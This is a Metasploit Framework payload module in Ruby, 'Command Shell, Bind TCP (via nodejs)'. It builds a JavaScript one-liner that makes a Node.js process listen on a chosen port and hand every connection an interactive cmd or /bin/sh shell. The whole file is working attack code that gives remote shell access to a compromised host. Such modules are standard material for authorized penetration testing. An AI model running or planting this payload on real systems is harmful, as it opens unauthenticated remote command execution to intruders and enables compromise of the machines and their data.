##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

# It would be better to have a commonjs payload, but because the implementations
# differ so greatly when it comes to require() paths for net modules, we will
# settle for just getting shells on nodejs.

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Command Shell, Bind TCP (via nodejs)',
      'Description'   => 'Creates an interactive shell via nodejs',
      'Author'        => ['joev'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'nodejs',
      'Arch'          => ARCH_NODEJS,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'nodejs',
      'Payload'       => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  #
  # Constructs the payload
  #
  def generate
    super + command_string
  end

  #
  # Returns the JS string to use for execution
  #
  def command_string
    cmd   = <<EOS
(function(){
  var require = global.require || global.process.mainModule.constructor._load;
  if (!require) return;

  var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
  var net = require("net"),
      cp = require("child_process"),
      util = require("util");

  var server = net.createServer(function(socket) {  
    var sh = cp.spawn(cmd, []);
    socket.pipe(sh.stdin);
    util.pump(sh.stdout, socket);
    util.pump(sh.stderr, socket);
  });
  server.listen(#{datastore['LPORT']});
})();
EOS
    return "#{cmd.gsub("\n",'').gsub(/\s+/,' ').gsub(/[']/, '\\\\\'')}"
  end
end
